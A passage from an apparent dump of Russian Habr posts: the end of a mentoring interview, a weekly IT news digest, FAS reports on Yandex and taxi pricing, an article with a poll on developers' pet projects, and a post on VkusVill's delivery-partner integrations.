авторитетом: нужно объяснять, что и почему ты предлагаешь. Ведь если цель — помочь менти на карьерном пути, то нужно помочь ему решить не только текущую проблему, но и последующие, устранять ошибочные когнитивные паттерны и прививать полезные. Также важно, чтобы между участниками выстроились правильные отношения.Игорь Полянский (ментор):Первое, что я сразу говорю, — я не Бог, не оракул и не Гугл. Я делюсь своим опытом, могу давать тебе советы с его высоты и стараюсь задавать тебе правильные вопросы. При этом, я, как любой человек, могу ошибаться, поэтому всё, что я говорю, не нужно воспринимать за истину в последней инстанции. Критическое мышление у менти должно работать на протяжении всей сессии.Конечно, нужно соблюдать баланс, чтобы всю встречу не занимало обсуждение какого-то одного момента. Например, один менти оспаривал каждую мысль, и мы практически не сдвигались с места.Второе — я не сделаю работу за тебя. Я могу помочь советом, могу задать правильные вопросы, направить куда нужно, могу даже помочь каким-то ресурсами, познакомить с нужными людьми, сказать, где конкретно копать, и так далее. Но инициатива должна исходить от тебя. С инициативными менти гораздо больше хочется помогать. Как готовиться к встрече с менторомМенторство немного похоже на репетиторство. Чтобы встреча прошла успешно, нужно, чтобы оба участника подготовились. Менти нужно сформулировать проблему (а правильно сформулированная проблема — наполовину решённая проблема), ментору — ознакомиться с ней и обдумать возможные решения.Игорь Полянский (ментор):Обычно перед встречей я прошу человека написать свободным текстом, что он хочет получить от менторства, какая у него проблема, чего он хочет достичь. Из того, что человек пишет, кристально понятно, какие у него ожидания. Если у меня появляются опасения на этом этапе, я обязательно их отдельно проговариваю, прям по пунктам. К первой встрече я заранее формулирую вопросы. Но в процессе появляются какие-то действия, которые уже требуются от меня: накопать информацию, познакомить с каким-то человеком, спросить ещё чьего-то совета. Это уже мне нужно сделать к нашей следующей встрече.Заявка Артёма на менторство выделялась среди других проработкой, подробным описанием, рассказом о себе, о контексте. Он старается подробно описать, что хочет обсудить: к чему прийти, какую проблему не может решить. Это избавляет от дополнительных вопросов: а сколько человек в команде разработки, как деплоите, какие дополнительные флаги используете? Кроме того, важна гибкость мышления.Артём Мосеев (менти):Ты должен быть готов принять что-то новое для себя. То есть ты приходишь, и тебе вдруг рассказывают, что у компании нет тестировщиков, пишут тесты программисты. Для кого-то это может быть блокером, и мы потратим полчаса на обсуждение этой проблемы.И ментору, и менти нужно писать заметки. Ментору — чтобы к следующей встрече знать, какие задачи были у менти и как он по ним продвинулся. Менти — чтобы зафиксировать обещания и на следующей встрече описать прогресс. Лучше делиться результатами заранее, чтобы ментор мог планировать диалог. Без заметок нельзя — спустя неделю уже будет сложно восстановить контекст.Чего точно не хочется увидеть на встрече?У ментора и менти свои антипаттерны. Менторы сталкиваются с завышенными ожиданиями.Игорь Полянский (ментор):Не нужно ожидать, что проблему решат за тебя. Это самое, самое плохое, что может ожидать менти.Иногда человек (особенно, если он платит деньги) ожидает, что ты за него сделаешь большую часть работы. Он уже рассматривает тебя часто не в качестве ментора, а в качестве консультанта. Вот тут нужно провести очень чёткую границу, в какой области лежит ответственность каждого.У менти другая проблема — авторитарность ментора.Артём Мосеев (менти):Я абсолютно не воспринимаю, когда мне говорят декларативно. Мне точно нужно знать, почему ты так решил. Ещё не хотелось бы, чтобы ментор не пытался погрузиться в мой контекст. Может, его решение работает в 90 % случаев, но не сработает в моём. Главное — вести конструктивный диалог, с аргументами “против” и “за”. Когда встречу с ментором можно считать успешной?Заключительный вопрос: как понять, хорошо ли прошла встреча? Сиюминутных результатов нет: как мы помним, ментор не даёт готовые решения, но размечает путь и предлагает свои варианты. Для Артёма ключевой критерий — получил ли он ответы на свои вопросы. Возможно, вопрос был только вершиной айсберга, и встреча помогла углубиться дальше — это тоже хорошо. Игорь как ментор занимается чаще рабочими задачами. В таком случае результатом  всегда должен быть план действий.Игорь Полянский (ментор):Даже если вы не можете сказать по завершении встречи, что вы до конца разобрались в проблеме и у вас нет стратегического плана на год вперёд — должны родиться хотя бы несколько первых шагов. Если такой план есть, он понятен вам обоим, то я думаю, что встреча прошла успешно.Отдельный вопрос — мотивация. Ментор всё-таки немножко коуч, и от встречи с ним что-то должно проясниться. Артём Мосеев (менти):После встречи должны остаться положительные эмоции. Чтобы ты был не выжат, а, наоборот, замотивирован дальше копать. Игорь Полянский (ментор):Если мы говорим о бизнес-психотерапии, такое тоже бывает. В этом случае ты судишь об успешности встречи по своим ощущениям. И они обычно позитивные, если получилось человеку поднять настроение, убедить его, что проблемы нет. Или она меньше, чем он ожидал. Или дать понять, что он не один.  С точки зрения мотивации мне кажется, всё зависит от мастерства менторов. У меня в своё время были разные менторы. После встреч с некоторыми из них я был как выжатый лимон, но я был удовлетворён, потому что эти люди жёстко и без прикрас говорили правильные вещи. С другими, наоборот, ты радуешься, а потом начинаешь рефлексировать: “Эх, а к чему в итоге пришли?”, и кажется, что ни к чему. Я в первую очередь за практический результат. А мотивация — это очень хороший, но побочный эффект, который может как возникнуть, так и не возникнуть.Что хотели сказатьМенторство не даёт огромных обещаний, это «мягкая сила». Но ментору оно помогает упорядочить собственный опыт, расширить поле экспертизы и избавиться от выгорания, а менти — взглянуть на ситуацию out of the box, составить план действий и добиться цели.Как говорил Эйнштейн, проблему сложно решить на том уровне, на котором она была сформулирована. Проблема может лежать прямо перед носом человека, но он её не видит, потому что обитает внутри той самой системы. Главное — не переставать пытаться её решить.Записала Слава @VladislavaZ ЖунинаУзнайте, как прокачаться и в других специальностях или освоить их с нуля:Профессия Data ScientistПрофессия Data AnalystКурс по Data EngineeringДругие профессии и курсыПРОФЕССИИ Профессия Fullstack-разработчик на Python Профессия Java-разработчик Профессия QA-инженер на JAVA Профессия Frontend-разработчик Профессия Этичный хакер Профессия C++ разработчик Профессия Разработчик игр на Unity Профессия Веб-разработчик Профессия iOS-разработчик с нуля Профессия Android-разработчик с нуляКУРСЫ Курс по Machine Learning Курс \"Machine Learning и Deep Learning\" Курс \"Математика для Data Science\" Курс \"Математика и Machine Learning для Data Science\" Курс \"Python для веб-разработки\" Курс \"Алгоритмы и структуры данных\" Курс по аналитике данных Курс по DevOps", {"day": "17", "month": "июня", "time": "13:01"}, {"rate": 33, "views": 5900}], ["Привет, Хабр! Раз в неделю я рассказываю о крупнейших событиях в отрасли в России и мире. Оригинальный ролик на YouTube, ниже расшифровка.Новости IT, стартапов и инвестиций за неделю.  Турция и Twitter  О политике, цензуре и войне государств с IT-компаниями в этот раз всего одна новость, она пришла из Турции. Twitter согласился исполнять турецкий закон о том, как соцсети должны работать в Турции. А именно, они должны открывать местные представительства, и должен быть местный человек, работающий в данном случае в Twitter, который будет заниматься модерацией и отвечать на запросы местных правоохранительных органов что-нибудь удалить или что-нибудь узнать. И вот теперь Twitter будет это делать.Метод, которым Турция добилась своего, довольно простой. Она не стала банить Twitter, она забанила рекламу на Twitter. Запретила турецким компаниям рекламироваться на Twitter, пока Twitter не согласится исполнять закон. Выручка упала — Twitter согласился. Все равно правила модерации будет определять штаб-квартира, и это не полная победа, хоть и победа.  Помните индийский опыт? Индия на одном из этапов борьбы пригрозила посадить местных сотрудников Twitter, пока штаб-квартира не примет ее условия. Теперь у Турции тоже появились заложники, которых тоже в принципе можно посадить. Bitcoin и биржа  Fidelity, это огромный американский фонд, подал заявку на создание ETF-фонда владеющего Bitcoin. Идея в том, что Fidelity будет покупать Bitcoin и продавать акции фонда, держащего Bitcoin, на обычной бирже. Чем больше их купят, тем больше он купит Bitcoin. Цена фонда будет прямо пропорциональной цене Bitcoin. Это будет нормальный классический актив, торгующий на нормальной классической бирже. Доступный абсолютно всем, без крипты сложной. С нее можно будет нормально платить налоги. Для потребителя это будет абсолютно нормальная система, а не сложная крипта.Два таких фонда недавно появились в Канаде. Но Канада это не так круто, как Соединенные Штаты. Как только оно появится на американской бирже, оно будет доступно всему миру, хоть клиентам наших брокеров, иди и покупай. Кажется, что это будет для многих интересно, кто не хочет связываться с криптой, а хочет оставаться в стандартном поле.РФПИ и телеграм  Отличная история случилось с облигациями Telegram. Неделю назад произошло их размещение, о чем я говорил в предыдущем выпуске. И сразу же РФПИ (Российский Фонд Прямых Инвестиций) сказал: «вот мы поучаствовали, вот мы купили облигации Telegram». И на следующий день Telegram ответил, что «нет, они не участвовали, они не покупали у нас наши облигации». Понятно, что РФПИ хочется сказать, что мы в какой-то форме инвестируем в отличный мировой проект, мы участники самых лучших сделок и так далее. Понятно, что Telegram хочет сказать, что нет, российский государственный фонд не имеет никакого отношения к нам, мы свободная компания, которая не около государства. Противоречие решилось довольно быстро. Выяснилось, что РФПИ действительно купил облигации. Но купил их не на размещении напрямую у Telegram, а перекупил у арабского фонда. Сейчас эти облигации попадут на биржу, может, уже попали, и за 1000 долларов их можно будет купить и поучаствовать в размещении не хуже, чем РФПИ. РФПИ правда 2 млн. долларов вложил, но это вопрос масштабов.Авито и инфобиз  С 1 апреля Авито запрещает размещать объявления о продаже аудиокниг, курсов и подобных информационных материалов. Первая мысль — борьба с пиратством. Понятно, что большая часть продажи была не лицензионная. Вторая мысль — может Авито собирается запустить какой-то образовательный проект и расчищает место, убирает конкуренцию с собственными продавцами.  ФАС и такси  ФАС выпустил заявление о том, что Яндекс и Везет неправы. Что Яндекс покупает активы Везет, что это испортит конкуренцию, от этого станет хуже. Но запретить ФАС не может, потому что формально лимиты не нарушены и нет повода для формальной проверки, а значит для формального запрета. Покупай, Яндекс, имеешь право. Как бы в компенсацию ФАС наконец разрешил сделку между Ситимобил и Gett. Теперь заказы, которые делают пассажиры Gett будут исполнять водители Ситимобил. Выгодно тем и другим. Gett может не заниматься водителями, а заниматься только пассажирами, заниматься только В2В продажами, как ему нравится. А Ситимобил получает дополнительные заказы, дополнительно нагружает своих водителей, улучшает качество своего маркетплейса.Насколько я понимаю, в некоторых городах это уже фактически происходит.  Вызываете Gett, приезжает Ситимобил.Wikipedia и деньги  Wikipedia объявила, что сделает специальный платный сервис для крупных корпораций. Google, Amazon и остальные, они очень активно используют Wikipedia в своих голосовых помощниках, Google в поиске. Везде показывают своим пользователям в релевантных случаях информацию, ответы из Wikipedia. И сейчас это делают совершенно бесплатно. Есть API, который позволяет по сути скачать всю Wikipedia и использовать ее информацию. Этот API останется работать, но Wikipedia говорит, что они сделают другую, более удобную API-шку и вот она будет платной. И она будет предназначена для Google, для его сниппетов, чтобы он сделать их еще лучше. Кажется, что лучше чем возможность скачать все и самому обрабатывать, сделать нельзя. Но, с другой стороны, кажется, что Google, Amazon и Facebook заплатят по несколько миллионов долларов Wikipedia, чтобы показать, что они поддерживают сообщество, что они готовы работать на коммерческих условиях, а не только пиратить, не только нахлебничать. Расходы Wikipedia порядка 100 млн. долларов в год. Они последние несколько лет с запасом перекрываются всякими донатами, грантами и подобным. Я очень давно уже не видел вымаливающих фотографий основателей в Wikipedia. Теперь они планируют добавить еще несколько десятков миллионов выручки коммерческой. Желаем успехов.  Wikipedia прекрасный проект.Инстаграм и шоппинг  Вышел пресс-релиз о том, что Instagram запустит Instagram Shopping в России. То есть, можно будет прям в Instagram делать прямо интернет-магазин. Есть много фичей о том, как выставлять товар, как отмечать, что это товары. Он работает в США и, наверное, в нескольких других странах. И вот теперь он заработает в России. Сам пресс-релиз я не нашел. Есть его перепечатка во многих изданиях, она везде одинаковая. И там нет ответа на самый интересный вопрос — будет ли оплата внутри Instagram. Будет ли там работать Facebook Pay, или надо будет переходить на какой-то другой сайт, чтобы там купить. В любом случае, это большая помощь всем продавцам, которые работают в Instagram. В любом случает Instagram начнет сильнее конкурировать с Ozon и всеми остальными. В любом случае пользователю только хорошо от этого.Новости одной строкой  Arrival через SPAC вышел на биржу. Оценка 12 млрд. долларов при том, что производство он еще не начал. Напомню, что основатель Arrival Денис Свердлов — россиянин.WeWork через SPAC скоро выйдет на биржу. Ожидаемая оценка 9 млрд. долларов.SEC на все это посмотрел и решил, что SPAC это что-то очень странное, что-то они слишком популярны, надо это расследовать. И пока ничего не сделал, но уже спросил всех участников, что за безобразие происходит.Playrix купил украинскую игровую студию. Mail.ru Games проинвестировал в российскую игровую студию и получил опцион докупить до контроля. В общем, игровые студии на территории СНГ становятся популярными. Mail.ru запустил Multimarket.pro. Единый интерфейс для продавца для работы на всех площадках Mail.ru. Английский сервис доставки еды Deliveroo подал заявку на IPO. В  Telegram на следующей неделе напишу, что написано в их проспекте. Оценка, между прочим, будет 11-12 млрд. долларов. Следующие новости на следующей неделе. Подписывайтесь на канал, нажимайте на колокольчик, чтобы их не пропустить.", {"day": "29", "month": "марта", "time": "15:21"}, {"rate": 15, "views": 2100}], ["24 февраля 2021 года Федеральная антимонопольная служба (ФАС) России выдала Яндексу предупреждение за создание дискриминационных условий в своей поисковой системе. Компания должна в течение месяца устранить все нарушения и обеспечить равные условия демонстрации сервисов на страницах поисковой системы, в том числе для остальных участников рынка, а также конкурентов группы компаний Яндекс. По истечении этого срока ранжирование результатов поисковой выдачи должно соответствовать единым правилам.\n\r\nВ случае невыполнения предупреждения в установленный срок, против Яндекса может быть возбуждено дело о нарушении антимонопольного законодательства. Тем более, что по заявлению ФАС в действиях Яндекса действительно обнаружены признаки злоупотребления доминирующим положением на рынке поиска в сети Интернет.\n\r\nПо информации «РИА Новости», Яндекс не согласен с предупреждением ФАС по поводу условий продвижения сторонних сервисов в поисковой выдаче. Пресс-служба компании заявила, что часть требований ведомства уже реализована в поиске, а исполнение остальных требований только ухудшит качество работы поиска.\n\r\nФактически ФАС требует, чтобы Яндекс прекратил преимущественно продвигать собственные сервисы в поисковой выдаче с помощью специнструментов «колдунщики» и «объектные ответы» (интерактивные обогащенные ответы).\n\r\nПолный текст предупреждения Яндексу опубликован в базе решений ФАС.\n\r\n«Мы не согласны с предупреждением ФАС. Некоторые требования предписания уже реализованы в поиске, однако отдельные важные его части мы считаем неправильными. Исполнение всех перечисленных требований ухудшит качество поиска для пользователя, а значит — положение поиска Яндекса на рынке по сравнению с конкурентами», — заявили в пресс-службе компании изданию «РИА Новости».\n\r\nВ начале августа 2020 года ivi, Avito, ЦИАН, «Профи.ру», «Туту.ру», Drom.ru, 2ГИС и Zoon обратились в ФАС по поводу действий Яндекса. Компании пожаловались на специальный виджет Яндекса в поисковой выдаче. Он служит для перехода пользователей на сервисы компании. Онлайн-сервисы недовольны тем, что им не обеспечивают равного доступа к виджету. Таким образом, полагают они, Яндекс пользуется доминирующим положением на рынке. Яндекс тогда пояснил, что «интерактивные ответы» соответствуют мировым отраслевым стандартам и не имеют преимуществ перед органической выдачей.\n\r\nЗа февраль этого года ФАС уже два раза обращала внимание на Яндекс. В начале месяца ФАС возбудила дело против Яндекса из-за рекламы сайтов по продаже выписок из ЕГРН. 20 февраля ФАС начала проверку повышения цен «Яндекс.Такси», «Ситимобил», Gett, «Везет» и «Максим» во время снегопада в Москве. Регулятор также планирует изучить влияние агрегаторов, в том числе Uber и «Яндекс.Такси», на рынок такси в целом в рамках выявления картельного сговора.", {"day": "24", "month": "февраля", "time": "15:50"}, {"rate": 19, "views": 9200}], ["По информации издания «Коммерсантъ», 20 февраля 2021 года Федеральная антимонопольная служба (ФАС) России начала проверку повышения цен до пяти раз агрегаторами и службами такси «Яндекс.Такси», «Ситимобил», Gett, «Везет» и «Максим» во время снегопада в конце прошлой недели в Москве. Регулятор также планирует изучить влияние агрегаторов, в том числе Uber и «Яндекс.Такси», на рынок такси в целом в рамках выявления картельного сговора. \n\r\nНесколько общественных организаций подали жалобы в ФАС на действия агрегаторов такси, они просят проверить необоснованных рост тарифов на пассажироперевозки в три-пять раз на фоне снегопадов.\n\r\nПредставители агрегаторов пояснили «Коммерсанту», что не получали запросов от ФАС по этой ситуации. \n\r\nСотрудник «Яндекс.Такси» уточнил изданию, что сами тарифы на услуги (стоимость километра пути и минуты поездки) сервисом не менялись. Однако, из-за снегопада изменились параметры поездки — ее длительность и средняя скорость в городе, которые влияют на цену. Также уменьшилась доступность водителей, которых по факту вышло на работу меньше, чем обычно. С другой стороны сервисы наблюдали увеличение числа заказов от клиентов. Но не все они смогли обработать. \n\r\nПредставитель «Ситимобила» рассказал, что цены выросли из-за повышающих коэффициентов, но система это регулировала в каждом конкретном случае. Также у сервиса есть ограничения, например, сервис не даст в 10 раз увеличить стоимость поездки.\n\r\nВ сервисе Gett добавили, что в таких ситуациях клиент может выбрать более дорогой класс обслуживания, цена на который из-за динамической цены поездки может быть меньше, чем эконом из-за его резкой востребованности.\n\r\n16 февраля Дептранс Москвы рассказал, что из-за увеличения агрегаторами стоимости поездки в 2-3 раза в Москве во время снегопада многие клиенты отказались от поездок, а спрос на такси упал на 28%. Именно на этот момент обратили внимание общественные организации в жалобе. Так как агрегаторы заявили, что спрос был большой. А по факту спрос сократился на 20% и больше, а цена резко повысились. Получилось, что водители простаивали, хотя могли брать клиентов по более низким тарифам.\n\r\nПримечательно, что 16 февраля ФАС сообщила, что не получала жалоб на подорожание поездок на такси в Москве из-за снегопада на прошлых выходных. Ведомство пояснило, что рынок такси — конкурентный, его цены не регулируются государством, а в случае ухудшения условий предоставления услуг применяется динамическое ценообразование.", {"day": "21", "month": "февраля", "time": "08:55"}, {"rate": 6, "views": 5300}], null, ["Личные проекты для разработчиков и инженеров – важная и интересная тема. В интернете есть множество упоминаний того, как такие проекты приводят к масштабным достижениям – так было в случае нобелевских лауреатов по физике Андрея Гейма и Константина Новоселова, чей эксперимент первоначально состоялся вечером в пятницу, когда ученые по традиции тестировали различные безумные на первый взгляд идеи. \n\r\nМногие компании также пытаются стимулировать такую активность работников – в Google было правило 20%, которое привело к рождению Gmail, AdSense и Google News, а в Twitter инженеры получали неделю свободную от обычных обязанностей для экспериментов – найти вакансии от столь же продвинутых компаний можно через бота @g_jobbot. \n\r\nДа что далеко ходить – недавно мы делали вебинар с Android-разработчиком Дмитрием Рязанцевым (вот его статья про работу на Toptal) – запущенную им игру Draw and Ride скачали 250,000 раз, а начиналась она именно как pet-проект. Звучит вдохновляюще, но насколько подход pet-проектов актуален в конце 2020 года? Считают ли до сих пор инженеры наличие таких проектов важным для себя и профессионального развития? С какими проблемами сталкиваются те, кто ими занимается? В новой статьей мы решили найти ответы на эти вопросы.\n\nЗачем нужны pet-проекты: аргументы «За»\r\nЕсть целый ряд аргументов, которые всегда приводят сторонники личных хобби-проектов. Вот главные и них.\n\nPet-проекты приносят удовольствие и позволяют развиваться\r\nРазработчик из Лондона Чанна Джайамуни (Channa Jayamuni) в своей статье на LinkedIn так описывает пользу pet-проектов:\n\nРазработка софта – отнюдь не самая увлекательная профессия до тех пор, пока вам не дали поработать над любимыми задачами. Если вы не работаете в Google или в похожей продвинутой компании с интересными проектами и низким уровнем стресса, то вряд ли ваша работа сплошь состоит из таких задач. В большинстве случаев разработчик может ожидать получить смесь из унылой рутины и относительно неплохих задач. Далеко не всем везет работать с новейшими технологиями в профессиональных средах, чтобы оставаться на острие развития отрасли просто выполняя рабочие обязанности. \r\nПо мнению инженера, решить эти проблемы наилучшим образом помогает именно развитие собственных проектов в свободное время.\n\nЛичные проекты помогают найти лучшую работу\r\nМногие руководители прямо заявляют о том, что наличие портфолио собственных проектов у инженера – один из ключевых пунктов при найме. \n\r\nТак директор компании-разработчика открытой NoSQL базы данных RAVENDB Айенде Райен (Ayende Rahien) говорит о том, что при поисках разработчиков смотрит на наличе страсти к работе. По мнению топ-менеджера, у специалистов, которые не могут найти время на развитие собственных проектов, такой страсти нет, они не собираются выходить за рамки рабочих обязанностей. Нанимать таких разработчиков в небольшую команду может быть не лучшей идеей.\n\nХотите найти работу, на которой пригодятся полученные в ходе запуска pet-проектов навыки? Используйте наш бот @g_jobbot. Его просто и быстро настроить: нужно указать свою сферу и стек технологий, желаемую зарплату, локацию или «релокейт». Подходящие вам варианты будут приходить в Телеграм.\n\n\n\nКомпаниям выгодно стимулировать эксперименты сотрудников\r\nМайк Миллер (Michael Miller) работает на позиции Engineering Manager в Bloomberg LP и считает, что компании должны официально позволять ведущим специалистам развивать свои проекты в рабочее время, и что такой подход может быть отдельной HR-плюшкой для талантливых работников: \n\nВаша задача – делать таких ведущих работников максимально счастливыми. Никогда не знаешь, что произойдет, если позволить талантливому специалисту развивать свою страсть. Вполне вероятно, это позволит открыть новую супер-звезду. Понятно, что возможность официально развивать свои проекты нужно заслужить. Если ты едва справляешься с непосредственными обязанностями, то о каких pet-проектах может идти речь? \nЧто может пойти не так\r\nНесмотря на очевидные плюсы, существует и целый ряд трудностей при работе над дополнительными проектами вне работы. Кто-то называет эти трудности мифами, как инженер Twitter Аннель Де Джагер (Annelle De Jager). Тем не менее, вот как выглядит этот список:\n\nНехватка времени\r\nНаписание кода – творческая работа, которая требует значительного количества сил. Инженерам просто необходимо отдыхать, плюс никто не отменял домашние дела, общение с друзьями и родственниками. В таких условиях найти время еще и на pet-проекты довольно трудно. \n\nОтношения с друзьями и семьей\r\nПункт частично вытекает из предыдущего. Если у человека есть семья и друзья, а он в какие-то моменты делает выбор не в их пользу, а в пользу написания кода – помимо работы! – но за который ему даже с высокой вероятностью не заплатят – это может выглядеть странно и даже вызывать обиды.\n\nНегативные эмоции в случае неудачи проекта\r\nКак и любой стартап, pet-проект может «не полететь», или специалист может увлечься другой технологией и захотеть попробовать что-то сделать с ее использованием. В таком случае текущий проект придется забросить или убить, это может быть психологически непросто. Ситуация усугубляется, если проект уже привлек первых пользователей, тогда неудача становится публичной. Такой негатив в дополнение к сложностям на основной работе нужен далеко не всем.\n\nЧто в итоге: немного статистики и опрос\r\nМы решили прояснить отношение разработчиков к ведению pet-проектов в текущих условиях удаленки и глобальной пандемии. Поэтому мы опросили знакомых инженеров из таких компаний как Gett, «Лаборатория Касперского», Uber, Smartcat и др. и задали им вопросы о том, развивают ли они pet-проекты и с какими трудностями сталкиваются при этом. Вот главные выводы по итогам опроса:\n\n\nИнженерам нравится заниматься своими проектами. Мы опросили пару десятков человек, и только четверо заявили о том, что не ведут никаких хобби-проектов от автоматизации собственных рабочих задач, до телеграм-ботов и робототехники.\nИзучение новых технологий – один из основных приоритетов. Наиболее частый ответ на вопрос «Зачем?» заключается в изучении новых технологий и профессиональном развитии. \nДополнительный заработок – важный стимул. Половина опрошенных заявили, что серьезно рассматривают или задумываются о том, чтобы начать зарабатывать на своих pet-проектах.\nСамое главное – удовольствие. Инженеры хотят получать удовольствие от работы, и pet-проекты дают им это. \n\nUPD: как к pet-проектам относятся читатели на Хабре\r\nПервые данные нашего опроса позволили нам собрать вот такую интересную статистику. Итак, большинство читателей Хабра ведут pet-проекты:\n\n\n\r\nПри этом только треть опрошенных думают заработать на своих хобби-проектах:\n\n\n\nЕсли вы ведете свои pet-проекты, укажите в боте @g_jobbot информацию о своих проектах, чтобы получать вакансии с учетом использованных в них технологий. Новая работа – отличный способ «монетизации» хобби!\r\nМы будем обновлять информацию по мере поступления новых голосов!\n\n***\r\nВедете ли pet-проекты вы? Если да, то зачем? Участвуйте в нашем опросе – соберем предпочтения аудитории Хабра, обновим статистику в посте и сделаем графики предпочтений русскоязычных инженеров!     Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста. Стоит ли тратить время на pet-проекты? \n            65.68%\n           Я работаю над своими pet-проектами \n            310\n           \n            15.47%\n           Нет на это времени – кода хватает на работе \n            73\n           \n            29.03%\n           Я хочу заработать на своем проекте \n            137\n           \n            39.41%\n           Мой pet-проект – для души, а не коммерции \n            186\n           \n            30.93%\n           Настоящий инженер должен развивать свои проекты \n            146\n           \n            7.42%\n           Если инженер находит время на сторонние проекты, ему не хватит сил на основную работу \n            35\n            \n       Проголосовали 472 пользователя.  \n\n       Воздержались 55 пользователей.", {"day": "11", "month": "ноября", "time": "18:35"}, {"rate": 13, "views": 52000}], ["В текущих реалиях многие магазины стали гораздо более активно уходить в онлайн и прокачивать собственную доставку, чтобы не терять клиентов. У «ВкусВилла» на начало года уже была собственная неплохая доставка, которая приносила больше лидов, чем доставка силами партнеров. Но как бы то ни было, чтобы больше людей могли получать свои заказы (а главное — получать их быстрее) активно развиваются и интеграции со сторонними службами доставки.\n\n\n\r\nЗа последние несколько месяцев мы в Автомаконе интегрировали «ВкусВилл» с двумя большими российскими партнерами. Для нас это был первый опыт интеграций с такими крупными компаниями. Но что интересно, для партнеров опыт интеграции тоже оказался в новинку. Деталями этого двустороннего процесса я бы и хотел поделиться.\n\nКак все работает\r\nПри проведении интеграции мы предпочитаем работать на основе пул-модели: партнеры предоставляют нам API, по которому мы запускаемся в качестве сервера, и по запросу выдаем им нужную информацию. Например, каталоги товаров и торговых точек, остатки на текущий момент. Это тот минимальный набор необходимой информации, которая нужна партнерам, чтобы на своей стороне сформировать заказ и передать его нам.\n\r\nНекоторые партнеры дополнительно настаивают на каких-то дополнительных нюансах, например, получении веб-куки. Часто мы можем пойти им навстречу: наше преимущество в том, что мы довольно гибкие и имеем большую свободу действий, поэтому внести какие-то изменения на нашей стороне бывает сильно проще, чем на стороне большого партнера. Но во всех таких ситуациях мы в первую очередь учитываем пожелания бизнеса, который и ставит нам задачи по интеграциям.\n\r\nДальше программист PHP пишет методы, начиная с авторизации. Как правило, работаем по стандартному сценарию. Чтобы интеграция заработала, нам нужно обмениваться определенными сегментами информации, о которых я уже сказал. Дальше мы синхронизируемся с партнером по статусам. Если мы работаем по API партнера, естественно, что наши внутренние статусы не совпадают со статусами заказа, которые приняты на той стороне. Для таких случаев мы пишем таблицу маппинга статусов и тестируем ее.\n\r\nСначала тесты проводятся без участия магазинов. Мы создаем какой-нибудь заказ напрямую в системах партнера и смотрим, в каком виде он у нас, а в каком — у партнера. Дальше уже выбираем какой-нибудь один магазин для тестирования, но и в этой ситуации заказы все еще генерируются искусственно. Затем мы этот магазин переводим на полноценную работу с партнером, и он начинает принимать живые заказы. А в конце мы постепенно масштабируемся на магазины в рамках города и регионов.\n\r\nНаша задача — провести заказ партнера через ручку — метод, и отдать всю информацию в нашу общую базу данных. Если говорить про стек, то методы мы пишем на PHP, а дальше в ход идет большая база SQL. Эти методы взаимодействуют с корневыми процедурами, написанными на SQL, которые уже создают заказы и прочее.\n\nИнтеграция с внешними партнерами — подводные камни\r\nНа данный момент мы провели интеграцию с маркетплейсами, службами доставки еды из ресторанов и, собственно, курьерами — службами такси.\n\r\nВ общем процесс передачи заказа через Delivery Club и другого сервиса доставки готовой еды выглядит вот так. Пользователь открывает приложение партнера, видит, что есть доставка из «ВкусВилла», и радостно начинает оформлять заказ. Когда пользователь сформировал корзину, партнер передает ее нам, магазин ее обрабатывает и возвращает обратно уже измененную корзину. А дальше готовый заказ ждет курьера партнера и отправляется вместе с ним к человеку, который его оформил. Магазины при этом обслуживают все заказы в порядке живой очереди, откуда бы они ни поступали — от партнеров или из приложения и сайта «ВкусВилл».\n\r\nНа первый взгляд, ничего сложного, но. Нельзя не учитывать тот факт, что покупатели заказывают из продуктовых магазинов не только штучные товары, но и весовые. Для нас весовые товары — это довольно большой сектор ассортимента, очень важно, чтобы у нас была возможность его доставлять покупателям. Но в процессе организации работы с компаниями, которые всегда доставляли только готовую еду, но никак не продукты питания, мы столкнулись с некоторыми ограничениями.\n\r\nПартнер обычно не очень охотно идет на изменение заказа, а в ситуации с весовыми товарами это неизбежно: история знает весьма мало случаев, когда при взвешивании апельсинов удается попасть в яблочко и положить в пакет ровно 600 граммов этих самых апельсинов. Ни больше, ни меньше.\n\nКопейка рубль округлит\r\nРаботая с весовыми товарами, невозможно избежать использования квантов. Квант — это средняя мера веса весового товара. Если мы говорим, например, про ананасы или курицу, в этих случаях квант определяется на основе среднего веса определенного количества товара. Знание о таком кванте приходит с опытом: если вы полгода поторгуете курицей, то узнаете, что ее средний вес — 900 граммов, у ананасов — 1 200 граммов.\n\r\nУ весовых товаров, обычно не покупаемых поштучно, например, яблок, квант рассчитывается из среднего веса одного пакета, который обычно берет покупатель. Так в магазинах «ВкусВилл» один квант яблок равен 600 граммам.\n\r\nКогда мы договаривались с одной из служб доставок о работе с весовыми товарами, было решено, что они будут принимать от нас цену за квант. И здесь нас ждала другая проблема: цена за один квант никогда не получается круглой — обязательно будут копейки. А партнеры не работают с копейками.\n\r\nПоэтому мы решили отдавать партнеру квант целым, а он будет умножать его на количество квантов и округлять. Но двойное округление, пройдя по кругу, дает нам расхождение, причем порой даже не просто в копейки, а уже в рубли. Тогда мы предложили принимать наши цены по заказу, потому что на кассе в любом случае должна соблюдаться формула «количество х цена = сумма», вне зависимости от того, куда и кому мы передаем цены за кванты. И это то, над чем наша команда сейчас работает.\n\r\nС технической точки зрения тонким моментом интеграции было время парсинга каталога. У нас больше тысячи магазинов, каждый из которых имеет свою товарную матрицу. И процесс получения партнером каталога в разрезе всех магазинов занимает много времени. Сейчас мы прорабатываем это направление и внедряем механизмы кеширования данных, чтобы обмениваться уже только изменениями.\n\r\nПервое время после запуска у нас также были сложности из-за человеческого фактора. Наши сборщики могли вместо клюквенного морса положить брусничный, заказ уходил к партнеру, а он не мог его принять, потому что этого морса не было в первоначальном заказе. С этой проблемой нам помогли справиться ребята, которые у нас занимаются фронтом: они прямо на кассах запретили замену товара для определенных партнеров.\n\r\nВ целом можно сказать, что у нас получилась полноценная интеграция с двумя самыми крупными службами. Да, есть над чем работать, но главная функциональность — прием и доставка заказа — работает довольно успешно. \n\nДругие интеграции\n\n\n\r\nОдной из главных целей нашей общей работы — максимально эффективная доставка товара, точнее, минимизация времени жизни заказа с момента наполнения корзины в приложении и до момента, когда заказ окажется у двери клиента. Поэтому мы интегрировались не только с партнерами-маркетплейсами, но и со службами доставки — Gett, Яндекс Такси, а также службой Net Fi.\n\r\nЗдесь нам важно определить возможность пешей или автомобильной доставки в зависимости от двух важных критериев: расстояния и веса заказа. Например, есть конкурс служб доставки, которым мы можем отдать заказ. Это может быть как наша внутренняя служба доставки, так и внешняя. И здесь можно настраивать в зависимости от приоритета одной службы перед другими, либо в разрезе магазинов и прочего.\n\r\nЕстественно, не бывает такого, чтобы две совершенно разные системы вошли в пазы 